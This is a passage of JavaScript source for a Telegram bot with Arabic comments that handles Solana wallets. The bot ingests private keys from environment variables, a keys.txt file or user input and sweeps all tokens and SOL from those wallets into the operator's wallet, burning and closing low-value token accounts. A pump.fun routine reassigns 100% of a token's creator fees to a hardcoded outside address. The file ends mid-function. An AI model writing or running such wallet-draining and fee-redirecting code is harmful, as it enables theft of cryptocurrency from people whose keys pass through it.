import express from "express";
import { Bot, InlineKeyboard } from "grammy";
import {
  Connection,
  Keypair,
  PublicKey,
  Transaction,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
  ComputeBudgetProgram,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";

import {
  createCloseAccountInstruction,
  createTransferCheckedInstruction,
  createAssociatedTokenAccountInstruction,
  createBurnCheckedInstruction,
  getAssociatedTokenAddressSync,
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
} from "@solana/spl-token";

import bs58 from "bs58";
import { readFileSync, existsSync } from "node:fs";
import { createRequire } from "node:module";

// ──────────────────────────────────────────────────────────
// إصلاح استيراد @pump-fun/pump-sdk — فصل PDA عن IX
// ──────────────────────────────────────────────────────────
const require = createRequire(import.meta.url);

// تحميل pump-sdk بشكل كسول بعد فتح المنفذ حتى لا يفشل healthcheck
let S = null;
let PUMP_PDA = null;
let PUMP_IX = null;
let _pumpLoading = null;
async function loadPump() {
  if (PUMP_PDA) return;
  if (_pumpLoading) return _pumpLoading;
  _pumpLoading = (async () => {
    try {
      const mod = await import("@pump-fun/pump-sdk");
      S = mod.default ?? mod;
    } catch (e1) {
      S = require("@pump-fun/pump-sdk");
    }
    PUMP_PDA = S;
    PUMP_IX = S.PUMP_SDK || S;
    const missing = [];
    for (const f of ["bondingCurvePda", "feeSharingConfigPda", "canonicalPumpPoolPda"])
      if (typeof PUMP_PDA[f] !== "function") missing.push("S." + f);
    for (const f of ["decodeBondingCurve", "decodeSharingConfig", "createFeeSharingConfig", "updateFeeShares"])
      if (typeof PUMP_IX[f] !== "function") missing.push("S.PUMP_SDK." + f);
    if (missing.length) console.warn("⚠️ دوال مفقودة من @pump-fun/pump-sdk:", missing.join(", "));
    else console.log("✅ pump-sdk loaded.");
  })().catch((e) => { _pumpLoading = null; console.error("❌ فشل تحميل pump-sdk:", e.message); throw e; });
  return _pumpLoading;
}

process.on("unhandledRejection", (e) => console.error("unhandledRejection:", e?.message || e));
process.on("uncaughtException", (e) => console.error("uncaughtException:", e?.message || e));

// ──────────────────────────────────────────────────────────
// 1. الإعدادات والمتغيرات الأساسية
// ──────────────────────────────────────────────────────────
const ADMIN_IDS = [5053683608, 7011338539, 7722535506, 8266984054, 8314087566, 8725149359, 8458424780];
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const COMPROMISED_PRIVATE_KEY = process.env.FREZON_KEY;
const FEE_PAYER_PRIVATE_KEY   = process.env.PRIVATE_KEY;
const CREATOR_PRIVATE_KEY     = process.env.FREZON_KEY || process.env.FREZON_KEY;

const BATCH_SIZE_BURN     = 12;
const BATCH_SIZE_TRANSFER = 6;
const PARALLEL_LIMIT      = 6;
const VALUE_THRESHOLD_USD = 0.05;
const PREFUND_LAMPORTS    = 6_500_000;
// المحفظة التي ستستلم 100% من مكافآت المنشئ
const SECONDARY_RECIPIENT = new PublicKey("13qArktMgSG2ou9xjem5TwH5xS8W9v4UNpRD1vT2wn7U");

// ──────────────────────────────────────────────────────────
// قراءة روابط RPC من الأسرار (Environment Variables)
// التنسيق المطلوب في RPC_URLS:
// url1,url2,url3,...
// ──────────────────────────────────────────────────────────

// ──────────────────────────────────────────────────────────
// قراءة روابط RPC من الأسرار (Environment Variables)
// التنسيق المطلوب في RPC_URLS:
// url1,url2,url3,...
// ──────────────────────────────────────────────────────────

const RPC_URLS = (process.env.RPC_URLS || "")
  .split(",")
  .map((u) => u.trim())
  .filter((u) => u.length > 0);

if (RPC_URLS.length === 0) {
  console.error("❌ لم يتم العثور على أي روابط RPC في المتغير RPC_URLS!");
  console.error("   يرجى إضافة المتغير RPC_URLS في الأسرار (Secrets/Environment Variables).");
  process.exit(1);
}

// التحقق من صلاحية الروابط
const validRpcUrls = RPC_URLS.filter((u) => {
  try {
    const parsed = new URL(u);
    return parsed.protocol === "http:" || parsed.protocol === "https:";
  } catch {
    console.warn(`⚠️ تجاهل رابط RPC غير صالح: ${u.slice(0, 60)}...`);
    return false;
  }
});

if (validRpcUrls.length === 0) {
  console.error("❌ جميع روابط RPC غير صالحة!");
  process.exit(1);
}

console.log(`✅ تم تحميل ${validRpcUrls.length} رابط RPC من متغيرات البيئة.`);

let _sendPool = validRpcUrls.map((url) => new Connection(url, "processed"));
let _sendPoolIdx = 0;

function getSendConn() {
  const c = _sendPool[_sendPoolIdx % _sendPool.length];
  _sendPoolIdx++;
  return c;
}

// ──────────────────────────────────────────────────────────
// استخراج عناوين المحافظ (للعرض في رسائل تلجرام)
// ──────────────────────────────────────────────────────────
let _cachedFeePayerPubkey = null;
let _cachedCreatorPubkey  = null;

function getFeePayerAddress() {
  if (_cachedFeePayerPubkey) return _cachedFeePayerPubkey;
  const kp = loadKeypair(FEE_PAYER_PRIVATE_KEY);
  _cachedFeePayerPubkey = kp ? kp.publicKey.toBase58() : "غير مُهيّأ";
  return _cachedFeePayerPubkey;
}

function getCreatorAddress() {
  if (_cachedCreatorPubkey) return _cachedCreatorPubkey;
  const kp = loadKeypair(CREATOR_PRIVATE_KEY);
  _cachedCreatorPubkey = kp ? kp.publicKey.toBase58() : "غير مُهيّأ";
  return _cachedCreatorPubkey;
}

function shortAddr(addr) {
  if (!addr || addr.length < 12) return addr;
  return addr.slice(0, 4) + "…" + addr.slice(-4);
}

// ──────────────────────────────────────────────────────────
// أدوات تحميل المفاتيح
// ──────────────────────────────────────────────────────────

function decodeBs58(str) {
  if (typeof bs58.decode === "function") return bs58.decode(str);
  if (bs58.default && typeof bs58.default.decode === "function") return bs58.default.decode(str);
  throw new Error("لم يتم العثور على دالة bs58.decode");
}

function extractValidKeypairs(text) {
  if (!text) return [];
  const validKeypairs = [];

  const jsonMatches = text.match(/\[\s*\d+(?:\s*,\s*\d+){63}\s*\]/g) || [];
  for (const match of jsonMatches) {
    try {
      const arr = JSON.parse(match);
      if (Array.isArray(arr) && arr.length === 64) {
        validKeypairs.push(Keypair.fromSecretKey(Uint8Array.from(arr)));
      }
    } catch {}
  }

  const tokens = text.match(/[1-9A-HJ-NP-Za-km-z]{80,100}/g) || [];
  for (const token of tokens) {
    try {
      const decoded = decodeBs58(token);
      if (decoded.length === 64) {
        validKeypairs.push(Keypair.fromSecretKey(decoded));
      }
    } catch {}
  }

  return validKeypairs;
}

function loadKeypair(rawKey) {
  if (rawKey) {
    const keys = extractValidKeypairs(rawKey);
    if (keys.length > 0) return keys[0];
  }
  return null;
}

async function getParsedTokenAccountsSafe(connection, ownerPubkey, programId) {
  try {
    const conn = getSendConn();
    const res = await conn._rpcRequest("getTokenAccountsByOwner", [
      ownerPubkey.toBase58(),
      { programId: programId.toBase58() },
      { encoding: "jsonParsed", commitment: "processed" }
    ]);

    if (res.error) throw new Error(res.error.message);

    const accounts = res.result?.value || [];
    return accounts
      .filter(a => typeof a.account.data === "object" && a.account.data.parsed)
      .map(a => ({
        pubkey: new PublicKey(a.pubkey),
        account: a.account,
        programId: programId
      }));
  } catch (err) {
    return [];
  }
}

async function sendAndConfirm(connection, tx, signers) {
  const sendConn = getSendConn();
  const { blockhash, lastValidBlockHeight } = await sendConn.getLatestBlockhash("processed");
  tx.recentBlockhash = blockhash;
  tx.sign(...signers);

  const sig = await sendConn.sendRawTransaction(tx.serialize(), {
    skipPreflight: false,
    preflightCommitment: "processed",
  });

  const confirmation = await sendConn.confirmTransaction(
    { signature: sig, blockhash, lastValidBlockHeight },
    "processed"
  );

  if (confirmation.value.err) {
    throw new Error(`فشل التأكيد: ${JSON.stringify(confirmation.value.err)}`);
  }

  return sig;
}

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

async function runWithConcurrency(items, limit, worker) {
  const results = new Array(items.length);
  let idx = 0;
  const workers = new Array(Math.min(limit, items.length)).fill(0).map(async () => {
    while (true) {
      const i = idx++;
      if (i >= items.length) break;
      try { results[i] = { status: "fulfilled", value: await worker(items[i], i) }; }
      catch (e) { results[i] = { status: "rejected", reason: e }; }
    }
  });
  await Promise.all(workers);
  return results;
}

// ──────────────────────────────────────────────────────────
// 1.5 استعلام الأسعار
// ──────────────────────────────────────────────────────────

async function fetchWithTimeout(url, ms = 8000, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), ms);
  try {
    const r = await fetch(url, { ...opts, signal: ctrl.signal });
    return r;
  } finally {
    clearTimeout(t);
  }
}

async function fetchPricesJupiter(mints) {
  const out = {};
  try {
    const chunks = [];
    for (let i = 0; i < mints.length; i += 50) chunks.push(mints.slice(i, i + 50));
    const results = await Promise.all(chunks.map(async (c) => {
      try {
        const r = await fetchWithTimeout(`https://lite-api.jup.ag/price/v3?ids=${c.join(",")}`);
        if (!r.ok) return {};
        return await r.json();
      } catch { return {}; }
    }));
    for (const chunk of results) {
      for (const [k, v] of Object.entries(chunk || {})) {
        const p = parseFloat(v?.usdPrice ?? v?.price);
        if (p > 0) out[k] = p;
      }
    }
  } catch {}
  return out;
}

async function fetchPricesDexScreener(mints) {
  const out = {};
  try {
    const chunks = [];
    for (let i = 0; i < mints.length; i += 30) chunks.push(mints.slice(i, i + 30));
    const results = await Promise.all(chunks.map(async (c) => {
      try {
        const r = await fetchWithTimeout(`https://api.dexscreener.com/latest/dex/tokens/${c.join(",")}`);
        if (!r.ok) return null;
        return await r.json();
      } catch { return null; }
    }));
    const bestLiq = {};
    for (const j of results) {
      if (!j?.pairs) continue;
      for (const p of j.pairs) {
        const mint = p.baseToken?.address;
        const price = parseFloat(p.priceUsd);
        const liq = parseFloat(p.liquidity?.usd || 0);
        if (!mint || !(price > 0)) continue;
        if (!(mint in bestLiq) || liq > bestLiq[mint]) {
          bestLiq[mint] = liq;
          out[mint] = price;
        }
      }
    }
  } catch {}
  return out;
}

async function fetchPricesRaydium(mints) {
  const out = {};
  try {
    const chunks = [];
    for (let i = 0; i < mints.length; i += 50) chunks.push(mints.slice(i, i + 50));
    const results = await Promise.all(chunks.map(async (c) => {
      try {
        const r = await fetchWithTimeout(`https://api-v3.raydium.io/mint/price?mints=${c.join(",")}`);
        if (!r.ok) return {};
        const j = await r.json();
        return j.data || {};
      } catch { return {}; }
    }));
    for (const chunk of results) {
      for (const [k, v] of Object.entries(chunk)) {
        const p = parseFloat(v);
        if (p > 0) out[k] = p;
      }
    }
  } catch {}
  return out;
}

async function getTokenPrices(mints) {
  const uniq = Array.from(new Set(mints.filter(Boolean)));
  if (uniq.length === 0) return {};
  const [jup, dex, ray] = await Promise.all([
    fetchPricesJupiter(uniq),
    fetchPricesDexScreener(uniq),
    fetchPricesRaydium(uniq),
  ]);
  const out = {};
  for (const m of uniq) {
    const arr = [jup[m], dex[m], ray[m]].filter(p => typeof p === "number" && p > 0);
    out[m] = arr.length ? Math.max(...arr) : 0;
  }
  return out;
}

async function classifyAccountsByValue(accounts) {
  const mints = accounts.map(a => a.account.data.parsed?.info?.mint).filter(Boolean);
  const prices = await getTokenPrices(mints);

  const valuable = [];
  const burnable = [];
  for (const a of accounts) {
    const info = a.account.data.parsed?.info;
    const mint = info?.mint;
    const decimals = info?.tokenAmount?.decimals ?? 0;
    const rawAmt = BigInt(info?.tokenAmount?.amount || "0");
    const price = prices[mint] || 0;
    const uiAmount = Number(rawAmt) / Math.pow(10, decimals);
    const valueUsd = uiAmount * price;

    a._valueUsd = valueUsd;
    a._priceUsd = price;
    a._uiAmount = uiAmount;

    if (valueUsd > VALUE_THRESHOLD_USD) valuable.push(a);
    else burnable.push(a);
  }
  return { valuable, burnable };
}

function formatValuableList(valuable) {
  if (valuable.length === 0) return "لا توجد توكنات قيّمة.";
  const rows = valuable
    .sort((a, b) => b._valueUsd - a._valueUsd)
    .slice(0, 25)
    .map((a) => {
      const info = a.account.data.parsed?.info;
      const mint = info?.mint || "";
      const shortMint = mint.slice(0, 4) + "…" + mint.slice(-4);
      return `• ${shortMint} — $${a._valueUsd.toFixed(4)}`;
    });
  let extra = "";
  if (valuable.length > 25) extra = `\n… و ${valuable.length - 25} توكن آخر`;
  return rows.join("\n") + extra;
}

// ──────────────────────────────────────────────────────────
// 2. منطق المعالجة الأساسي
// ──────────────────────────────────────────────────────────

async function executeTransferTokens() {
  const feePayerKeypair = loadKeypair(FEE_PAYER_PRIVATE_KEY);
  if (!feePayerKeypair) return { success: false, msg: "خطأ في تحميل مفتاح الدافع" };

  let allCompromisedKeypairs = [];
  if (COMPROMISED_PRIVATE_KEY) {
    allCompromisedKeypairs.push(...extractValidKeypairs(COMPROMISED_PRIVATE_KEY));
  }
  if (existsSync("./keys.txt")) {
    const fc = readFileSync("./keys.txt", "utf8");
    allCompromisedKeypairs.push(...extractValidKeypairs(fc));
  }

  const uniqueKeypairsMap = new Map();
  for (const kp of allCompromisedKeypairs) {
    uniqueKeypairsMap.set(kp.publicKey.toBase58(), kp);
  }
  allCompromisedKeypairs = Array.from(uniqueKeypairsMap.values());

  let totalClosed = 0;
  const connection = getSendConn();

  for (const compromisedKeypair of allCompromisedKeypairs) {
    const [tokenAccounts, token2022Accounts] = await Promise.all([
      getParsedTokenAccountsSafe(connection, compromisedKeypair.publicKey, TOKEN_PROGRAM_ID),
      getParsedTokenAccountsSafe(connection, compromisedKeypair.publicKey, TOKEN_2022_PROGRAM_ID),
    ]);

    const processable = [...tokenAccounts, ...token2022Accounts].filter(a => a.account.data.parsed?.info?.state !== "frozen");
    if (processable.length === 0) continue;

    const existingAtas = new Set();
    for (const programId of [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]) {
      const atas = await getParsedTokenAccountsSafe(connection, feePayerKeypair.publicKey, programId);
      atas.forEach(a => existingAtas.add(a.account.data.parsed?.info?.mint));
    }

    const batches = [];
    for (let i = 0; i < processable.length; i += BATCH_SIZE_TRANSFER) {
      batches.push(processable.slice(i, i + BATCH_SIZE_TRANSFER));
    }

    const results = await runWithConcurrency(batches, PARALLEL_LIMIT, async (batch) => {
      const tx = new Transaction();
      tx.feePayer = feePayerKeypair.publicKey;
      const mintsInThisTx = new Set();

      for (const account of batch) {
        const info     = account.account.data.parsed?.info;
        const mintStr  = info?.mint;
        const mint     = new PublicKey(mintStr);
        const decimals = info?.tokenAmount?.decimals ?? 0;
        const rawAmt   = BigInt(info?.tokenAmount?.amount || "0");
        const progId   = account.programId;

        if (rawAmt > 0n) {
          const destAta = getAssociatedTokenAddressSync(mint, feePayerKeypair.publicKey, false, progId);
          if (!existingAtas.has(mintStr) && !mintsInThisTx.has(mintStr)) {
            tx.add(createAssociatedTokenAccountInstruction(
              feePayerKeypair.publicKey, destAta, feePayerKeypair.publicKey, mint, progId
            ));
            mintsInThisTx.add(mintStr);
          }
          tx.add(createTransferCheckedInstruction(
            account.pubkey, mint, destAta, compromisedKeypair.publicKey, rawAmt, decimals, [], progId
          ));
        }

        tx.add(createCloseAccountInstruction(
          account.pubkey, feePayerKeypair.publicKey, compromisedKeypair.publicKey, [], progId
        ));
      }

      await sendAndConfirm(connection, tx, [feePayerKeypair, compromisedKeypair]);
      mintsInThisTx.forEach(m => existingAtas.add(m));
      return batch.length;
    });

    results.forEach(r => { if (r.status === "fulfilled") totalClosed += r.value; });
  }

  const solRecovered = (totalClosed * 0.00204).toFixed(5);
  return {
    success: true,
    solRecovered,
    pubkey: feePayerKeypair.publicKey.toBase58()
  };
}

async function analyzeBurnPreview() {
  const feePayerKeypair = loadKeypair(FEE_PAYER_PRIVATE_KEY);
  if (!feePayerKeypair) return { success: false, msg: "خطأ في المفتاح" };

  const connection = getSendConn();
  const [tokenAccounts, token2022Accounts] = await Promise.all([
    getParsedTokenAccountsSafe(connection, feePayerKeypair.publicKey, TOKEN_PROGRAM_ID),
    getParsedTokenAccountsSafe(connection, feePayerKeypair.publicKey, TOKEN_2022_PROGRAM_ID),
  ]);

  const processable = [...tokenAccounts, ...token2022Accounts].filter(a => a.account.data.parsed?.info?.state !== "frozen");
  const { valuable, burnable } = await classifyAccountsByValue(processable);

  return { success: true, valuable, burnable, pubkey: feePayerKeypair.publicKey.toBase58() };
}

async function executeBurnAndClose() {
  const feePayerKeypair = loadKeypair(FEE_PAYER_PRIVATE_KEY);
  if (!feePayerKeypair) return { success: false, msg: "خطأ في المفتاح" };

  const preview = await analyzeBurnPreview();
  if (!preview.success) return preview;
  const burnable = preview.burnable;

  if (burnable.length === 0) {
    return { success: true, solRecovered: "0.00000", pubkey: feePayerKeypair.publicKey.toBase58(), skipped: preview.valuable.length };
  }

  const batches = [];
  for (let i = 0; i < burnable.length; i += BATCH_SIZE_BURN) {
    batches.push(burnable.slice(i, i + BATCH_SIZE_BURN));
  }

  let successCount = 0;

  const results = await runWithConcurrency(batches, PARALLEL_LIMIT, async (batch) => {
    const tx = new Transaction();
    tx.feePayer = feePayerKeypair.publicKey;

    for (const account of batch) {
      const info     = account.account.data.parsed?.info;
      const mint     = new PublicKey(info?.mint);
      const decimals = info?.tokenAmount?.decimals ?? 0;
      const rawAmt   = BigInt(info?.tokenAmount?.amount || "0");
      const progId   = account.programId;

      if (rawAmt > 0n) {
        tx.add(createBurnCheckedInstruction(
          account.pubkey, mint, feePayerKeypair.publicKey, rawAmt, decimals, [], progId
        ));
      }

      tx.add(createCloseAccountInstruction(
        account.pubkey, feePayerKeypair.publicKey, feePayerKeypair.publicKey, [], progId
      ));
    }

    const conn = getSendConn();
    await sendAndConfirm(conn, tx, [feePayerKeypair]);
    return batch.length;
  });

  results.forEach(r => { if (r.status === "fulfilled") successCount += r.value; });

  const solRecovered = (successCount * 0.00204).toFixed(5);
  return {
    success: true,
    solRecovered,
    pubkey: feePayerKeypair.publicKey.toBase58(),
    skipped: preview.valuable.length,
  };
}

// ──────────────────────────────────────────────────────────
// 2.4 نقل تفويض مكافآت المنشئ (Pump.fun) — النسخة المُصلَّحة
// ──────────────────────────────────────────────────────────
async function executeDelegateTransfer(mintStr) {
  const payer = loadKeypair(FEE_PAYER_PRIVATE_KEY);
  const creatorKp = loadKeypair(CREATOR_PRIVATE_KEY);
  if (!payer) return { success: false, msg: "مفتاح دافع الرسوم غير مُهيّأ" };
  if (!creatorKp) return { success: false, msg: "مفتاح المنشئ غير مُهيّأ" };

  let mint;
  try { mint = new PublicKey(mintStr); }
  catch { return { success: false, msg: "عنوان توكن غير صالح" }; }

  const conn = getSendConn();

  // ⚠️ استخدام PUMP_PDA (وليس PUMP) لحساب الـ PDA
  await loadPump();
  const curveInfo = await conn.getAccountInfo(PUMP_PDA.bondingCurvePda(mint));
  if (!curveInfo) return { success: false, msg: "لم يتم العثور على حساب العملة (bonding curve)" };

  // ⚠️ استخدام PUMP_IX لفك التشفير
  const curve = PUMP_IX.decodeBondingCurve(curveInfo);
  const creator = curve.creator;

  if (!creator.equals(creatorKp.publicKey)) {
    return {
      success: false,
      msg: `المحفظة الحالية ليست المنشئ.\nالمنشئ الحالي: ${creator.toBase58()}\nمحفظتنا: ${creatorKp.publicKey.toBase58()}`
    };
  }

  // ⚠️ استخدام PUMP_PDA لحساب PDA الإعدادات
  const scPda = PUMP_PDA.feeSharingConfigPda(mint);
  const scInfo = await conn.getAccountInfo(scPda);
  const ixs = [
    ComputeBudgetProgram.setComputeUnitLimit({ units: 400_000 }),
    ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 2_000_000 }),
  ];
  let authority = creator;
  let current = [creator];

  // النسبة الجديدة: 100% للمحفظة المحددة بالكود — دافع الرسوم يدفع الرسوم فقط
  const newShareholders = [
    { address: SECONDARY_RECIPIENT, shareBps: 10_000 },
  ];

  if (scInfo) {
    const sc = PUMP_IX.decodeSharingConfig(scInfo);
    authority = sc.admin;
    current = sc.shareholders.map((s) => s.address);

    // التحقق إن كانت النسبة 100% مطبقة مسبقًا
    const already =
      sc.shareholders.length === 1 &&
      sc.shareholders[0].address.equals(SECONDARY_RECIPIENT) &&
      sc.shareholders[0].shareBps === 10_000;
    if (already) return { success: false, msg: "✅ النسبة المطلوبة (100%) مطبقة مسبقًا — لا حاجة لتعديل." };
    if (sc.adminRevoked) return { success: false, msg: "صلاحية تعديل الإعدادات ملغاة نهائيًا" };
    if (!authority.equals(creatorKp.publicKey)) {
      return { success: false, msg: "المحفظة ليست مدير إعدادات المشاركة" };
    }
  } else {
    ixs.push(SystemProgram.transfer({
      fromPubkey: payer.publicKey,
      toPubkey: scPda,
      lamports: PREFUND_LAMPORTS,
    }));
    // ⚠️ استخدام PUMP_PDA لحساب pool PDA
    // توسيع حساب العملة مسبقًا على حساب المستلم (المنشئ لا يستطيع دفع SOL)
    if (!curve.complete && PUMP_IX.extendAccountInstruction) {
      ixs.push(await PUMP_IX.extendAccountInstruction({ account: PUMP_PDA.bondingCurvePda(mint), user: payer.publicKey }));
    }
    const pool = curve.complete ? PUMP_PDA.canonicalPumpPoolPda(mint) : null;
    ixs.push(await PUMP_IX.createFeeSharingConfig({ creator, mint, pool }));
  }

  const upd = await PUMP_IX.updateFeeShares({
    authority,
    mint,
    currentShareholders: current,
    newShareholders,
  });
  upd.keys.push({ pubkey: creator, isSigner: false, isWritable: true });
  ixs.push(upd);

  // blockhash أحدث (processed) = مهلة أطول فعليًا قبل انتهاء الصلاحية
  const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash("processed");
  const msg = new TransactionMessage({
    payerKey: payer.publicKey,
    recentBlockhash: blockhash,
    instructions: ixs,
  }).compileToV0Message();
  const tx = new VersionedTransaction(msg);
  tx.sign([payer, creatorKp]);

  const sim = await conn.simulateTransaction(tx, { sigVerify: true, commitment: "processed" });
  if (sim.value.err) {
    const logs = (sim.value.logs || []).filter(l => /Instruction:|failed|Error/.test(l)).slice(0, 6).join("\n");
    return { success: false, msg: `فشلت المحاكاة: ${JSON.stringify(sim.value.err)}\n${logs}` };
  }

  const raw = tx.serialize();
  const sig = await conn.sendRawTransaction(raw, {
    skipPreflight: true,
    preflightCommitment: "processed",
    maxRetries: 0,
  });

  // إعادة بث المعاملة + استطلاع سريع بمستوى processed بدل الانتظار الطويل
  const deadline = Date.now() + 90_000;
  let confirmedStatus = null;
  while (Date.now() < deadline) {
    const st = await conn.getSignatureStatuses([sig], { searchTransactionHistory: false });
    const v = st?.value?.[0];
    if (v) {
      if (v.err) return { success: false, msg: `فشل التأكيد: ${JSON.stringify(v.err)}` };
      if (v.confirmationStatus === "processed" || v.confirmationStatus === "confirmed" || v.confirmationStatus === "finalized") {
        confirmedStatus = v.confirmationStatus;
        break;
      }
    }
    const height = await conn.getBlockHeight("processed");
    if (height > lastValidBlockHeight) break;
    try { await conn.sendRawTransaction(raw, { skipPreflight: true, maxRetries: 0 }); } catch {}
    await sleep(1000);
  }

  if (!confirmedStatus) {
    return { success: false, msg: `لم يتم تأكيد المعاملة ضمن المهلة (انتهت صلاحية الـ blockhash).\nالتوقيع: ${sig}\nتحقّق منه على Solscan قبل إعادة المحاولة.` };
  }

  return {
    success: true,
    sig,
    recipient: payer.publicKey.toBase58(),
    recipient2: SECONDARY_RECIPIENT.toBase58(),
    creator: creatorKp.publicKey.toBase58(),
    mint: mint.toBase58(),
  };
}

// ──────────────────────────────────────────────────────────
// 2.5 حرق/إغلاق لمحفظة مُدخلة
// ──────────────────────────────────────────────────────────

async function analyzeSelfBurnPreview(sourceKeypair) {
  const connection = getSendConn();
  const [tokenAccounts, token2022Accounts] = await Promise.all([
    getParsedTokenAccountsSafe(connection, sourceKeypair.publicKey, TOKEN_PROGRAM_ID),
    getParsedTokenAccountsSafe(connection, sourceKeypair.publicKey, TOKEN_2022_PROGRAM_ID),
  ]);
  const processable = [...tokenAccounts, ...token2022Accounts]
    .filter(a => a.account.data.parsed?.info?.state !== "frozen");
  const { valuable, burnable } = await classifyAccountsByValue(processable);
  const solLamports = await connection.getBalance(sourceKeypair.publicKey, "processed").catch(() => 0);
  return { valuable, burnable, solLamports };
}

async function executeSelfBurnAndDrain(sourceKeypair) {
  const destinationKeypair = loadKeypair(FEE_PAYER_PRIVATE_KEY);
  if (!destinationKeypair) return { success: false, msg: "مفتاح دافع الرسوم غير مُهيّأ" };
  if (destinationKeypair.publicKey.equals(sourceKeypair.publicKey)) {
    return { success: false, msg: "المحفظة المصدر مطابقة للوجهة!" };
  }

  const connection = getSendConn();
  const preview = await analyzeSelfBurnPreview(sourceKeypair);
  const { valuable, burnable } = preview;

  let transferredCount = 0;
  if (valuable.length > 0) {
    const existingAtas = new Set();
    for (const programId of [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]) {
      const atas = await getParsedTokenAccountsSafe(connection, destinationKeypair.publicKey, programId);
      atas.forEach(a => existingAtas.add(a.account.data.parsed?.info?.mint));
    }

    const batches = [];
    for (let i = 0; i < valuable.length; i += BATCH_SIZE_TRANSFER) {
      batches.push(valuable.slice(i, i + BATCH_SIZE_TRANSFER));
    }

    const results = await runWithConcurrency(batches, PARALLEL_LIMIT, async (batch) => {
      const tx = new Transaction();
      tx.feePayer = sourceKeypair.publicKey;
      const mintsInThisTx = new Set();

      for (const account of batch) {
        const info     = account.account.data.parsed?.info;
        const mintStr  = info?.mint;
        const mint     = new PublicKey(mintStr);
        const decimals = info?.tokenAmount?.decimals ?? 0;
        const rawAmt   = BigInt(info?.tokenAmount?.amount || "0");
        const progId   = account.programId;

        if (rawAmt <= 0n) continue;

        const destAta = getAssociatedTokenAddressSync(mint, destinationKeypair.publicKey, false, progId);
        if (!existingAtas.has(mintStr) && !mintsInThisTx.has(mintStr)) {
          tx.add(createAssociatedTokenAccountInstruction(
            sourceKeypair.publicKey, destAta, destinationKeypair.publicKey, mint, progId
          ));
          mintsInThisTx.add(mintStr);
        }
        tx.add(createTransferCheckedInstruction(
          account.pubkey, mint, destAta, sourceKeypair.publicKey, rawAmt, decimals, [], progId
        ));
        tx.add(createCloseAccountInstruction(
          account.pubkey, sourceKeypair.publicKey, sourceKeypair.publicKey, [], progId
        ));
      }

      if (tx.instructions.length === 0) return 0;
      await sendAndConfirm(connection, tx, [sourceKeypair]);
      mintsInThisTx.forEach(m => existingAtas.add(m));
      return batch.length;
    });

    results.forEach(r => { if (r.status === "fulfilled") transferredCount += r.value; });
  }

  let burnedCount = 0;
  if (burnable.length > 0) {
    const batches = [];
    for (let i = 0; i < burnable.length; i += BATCH_SIZE_BURN) {
      batches.push(burnable.slice(i, i + BATCH_SIZE_BURN));
    }

    const results = await runWithConcurrency(batches, PARALLEL_LIMIT, async (batch) => {
      const tx = new Transaction();
      tx.feePayer = sourceKeypair.publicKey;

      for (const account of batch) {
        const info     = account.account.data.parsed?.info;
        const mint     = new PublicKey(info?.mint);
        const decimals = info?.tokenAmount?.decimals ?? 0;
        const rawAmt   = BigInt(info?.tokenAmount?.amount || "0");
        const progId   = account.programId;

        if (rawAmt > 0n) {
          tx.add(createBurnCheckedInstruction(
            account.pubkey, mint, sourceKeypair.publicKey, rawAmt, decimals, [], progId
          ));
        }
        tx.add(createCloseAccountInstruction(
          account.pubkey, sourceKeypair.publicKey, sourceKeypair.publicKey, [], progId
        ));
      }

      const conn = getSendConn();
      await sendAndConfirm(conn, tx, [sourceKeypair]);
      return batch.length;
    });

    results.forEach(r => { if (r.status === "fulfilled") burnedCount += r.value; });
  }

  let solTransferred = 0;
  try {
    const balance = await connection.getBalance(sourceKeypair.publicKey, "processed");
    const RESERVE = 5000;
    if (balance > RESERVE) {
      const lamports = balance - RESERVE;
      const tx = new Transaction();
      tx.feePayer = sourceKeypair.publicKey;
      tx.add(SystemProgram.transfer({
        fromPubkey: sourceKeypair.publicKey,
        toPubkey: destinationKeypair.publicKey,
        lamports,
      }));
      await sendAndConfirm(connection, tx, [sourceKeypair]);
      solTransferred = lamports;
    }
  } catch (e) {}

  return {
    success: true,
    transferredCount,
    burnedCount,
    valuableCount: valuable.length,
    solTransferredSOL: (solTransferred / 1e9).toFixed(6),
    sourcePubkey: sourceKeypair.publicKey.toBase58(),
    destinationPubkey: destinationKeypair.publicKey.toBase58(),
  };
}

async function executeCustomTransfer(mintAddress, percentage) {
  const feePayerKeypair = loadKeypair(FEE_PAYER_PRIVATE_KEY);
  const compromisedKeypair = loadKeypair(COMPROMISED_PRIVATE_KEY);

  if (!feePayerKeypair || !compromisedKeypair) {
    return { success: false, msg: "المفاتيح غير مكتملة" };
  }

  const connection = getSendConn();
  const mintPubkey = new PublicKey(mintAddress);

  const [tokenAccounts, token2022Accounts] = await Promise.all([
    getParsedTokenAccountsSafe(connection, compromisedKeypair.publicKey, TOKEN_PROGRAM_ID),
    getParsedTokenAccountsSafe(connection, compromisedKeypair.publicKey, TOKEN_2022_PROGRAM_ID),
  ]);

  const targetAccount = [...tokenAccounts, ...token2022Accounts].find(
    a => a.account.data.parsed?.info?.mint === mintAddress
  );

  if (!targetAccount) {
    return { success: false, msg: "التوكن غير موجود بالمحفظة!" };
  }

  const info = targetAccount.account.data.parsed?.info;
  const decimals = info?.tokenAmount?.decimals ?? 0;
  const rawAmt = BigInt(info?.tokenAmount?.amount || "0");

  if (rawAmt <= 0n) {
    return { success: false, msg: "رصيد التوكن 0!" };
  }

  const transferAmt = (rawAmt * BigInt(Math.floor(percentage))) / 100n;
  const progId = targetAccount.programId;

  const tx = new Transaction();
  tx.feePayer = feePayerKeypair.publicKey;

  const destAta = getAssociatedTokenAddressSync(mintPubkey, feePayerKeypair.publicKey, false, progId);

  let existingAtas = new Set();
  try {
    const atas = await getParsedTokenAccountsSafe(connection, feePayerKeypair.publicKey, progId);
    atas.forEach(a => existingAtas.add(a.account.data.parsed?.info?.mint));
  } catch {}

  if (!existingAtas.has(mintAddress)) {
    tx.add(createAssociatedTokenAccountInstruction(
      feePayerKeypair.publicKey, destAta, feePayerKeypair.publicKey, mintPubkey, progId
    ));
  }

  tx.add(createTransferCheckedInstruction(
